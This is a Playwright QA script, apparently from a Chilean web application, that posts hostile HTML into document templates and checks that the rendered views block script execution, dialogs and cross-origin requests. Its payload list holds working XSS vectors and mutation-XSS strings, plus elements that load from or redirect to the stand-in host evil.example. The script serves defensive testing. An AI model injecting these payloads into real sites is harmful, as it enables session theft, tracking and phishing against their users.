// Prueba de XSS en navegador real: publica contenido hostil como plantilla y como documento (POST directo, sin pasar por el editor),
// abre las vistas y comprueba que no se ejecutó nada (alert/confirm/prompt), no hubo peticiones a otros orígenes ni navegación a javascript:.
//   NODE_PATH=... CHROME_PATH=... BASE_URL=http://127.0.0.1:8124 CRED=cred.json node scripts/qa-xss.cjs
const { chromium } = require('playwright-core');
const fs = require('fs');
const BASE = (process.env.BASE_URL || 'http://127.0.0.1:8124').replace(/\/$/, '');
const CRED = JSON.parse(fs.readFileSync(process.env.CRED || 'cred.json', 'utf8'));
const PAYLOADS = [
  '<img src=x onerror="window.__xss=1;alert(1)">', '<svg onload="window.__xss=1;alert(1)"></svg>', '<a href="javascript:window.__xss=1;alert(1)">clic</a>', '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<iframe src="//evil.example/x"></iframe>', '<img src="https://evil.example/track.gif">', '<img src="//evil.example/track.gif">', '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>body{background:url(https://evil.example/b.png)}</style>', '<div style="background:url(https://evil.example/b.png)">x</div>', '<form action="https://evil.example"><input name=a><button>enviar</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">', '<base href="https://evil.example/">', '<object data="https://evil.example/x"></object>', '<embed src="https://evil.example/x">',
  '<a href="//evil.example/phishing">enlace</a>', '<video src=x onerror=alert(1)></video>', '<details open ontoggle="alert(1)">d</details>', '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<script>window.__xss=1;alert(1)</script>', "Texto con inversi‮ón y ​invisibles",
];
(async () => {
  const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, args: ['--no-sandbox'] });
  const ctx = await browser.newContext({ locale: 'es-CL' }); const page = await ctx.newPage();
  const externos = []; const dialogos = [];
  page.on('dialog', async d => { dialogos.push(d.message()); await d.dismiss(); });
  page.on('request', r => { if (!r.url().startsWith(BASE) && !r.url().startsWith('data:') && !r.url().startsWith('about:')) externos.push(r.url()); });
  await page.goto(BASE + '/ingreso/pruebas'); await page.fill('#run', '10000001-6'); await page.fill('#password', CRED['10000001-6']); await page.click('button:has-text("Ingresar")'); await page.waitForLoadState('load');
  const fallas = []; let n = 0;
  for (const p of PAYLOADS) {
    await page.goto(BASE + '/app/admin/plantillas/nuevo'); await page.waitForSelector('.tox-tinymce');
    const token = await page.$eval('meta[name=csrf-token]', m => m.content);
    const r = await page.request.post(BASE + '/app/admin/plantillas', { form: { _token: token, nombre: 'XSS ' + (++n), tipo_documento_id: '3', alcance: 'todas', contenido_html: '<p>TEXTO_OK</p>' + p + '<p>FIN_OK</p>' }, maxRedirects: 0 });
    if (r.status() !== 302) { fallas.push('POST no aceptado: ' + p.slice(0, 40) + ' (' + r.status() + ')'); continue; }
    const id = (r.headers()['location'] || '').match(/plantillas\/(\d+)/)?.[1];
    for (const u of ['/app/formatos/' + id, '/app/admin/plantillas/' + id, '/app/admin/plantillas/' + id + '/versiones/1']) {
      await page.goto(BASE + u, { waitUntil: 'load' }); await page.waitForTimeout(250);
      for (const a of await page.$$('.formato-vista a')) { await a.click({ timeout: 1000, noWaitAfter: true }).catch(() => {}); await page.goBack().catch(() => {}); }
      const xss = await page.evaluate(() => !!window.__xss); if (xss) fallas.push('SE EJECUTÓ código en ' + u + ' con ' + p.slice(0, 40));
      const html = (await page.content()).replace(/<textarea[\s\S]*?<\/textarea>/gi, '').replace(/<iframe[^>]*tox-edit-area[^>]*>/gi, ''); const m = /<script>window\.__xss|\sonerror=|\sonload=|javascript:window/i.exec(html); if (m) fallas.push('marcado hostil presente en ' + u + ' (' + p.slice(0, 30) + '): ...' + html.slice(Math.max(0, m.index - 40), m.index + 60).replace(/\s+/g, ' '));
    }
  }
  if (dialogos.length) fallas.push('diálogos de JavaScript mostrados: ' + dialogos.length);
  if (externos.length) fallas.push('peticiones a otros orígenes: ' + [...new Set(externos)].join(', '));
  await browser.close();
  console.log(fallas.length ? 'FALLAS (' + fallas.length + '):\n - ' + fallas.join('\n - ') : 'OK: ' + PAYLOADS.length + ' cargas hostiles × 3 vistas sin ejecución de código, sin diálogos y sin peticiones externas');
  process.exit(fallas.length ? 1 : 0);
})().catch(e => { console.error('EXCEPCIÓN', e.message.split('\n')[0]); process.exit(2); });
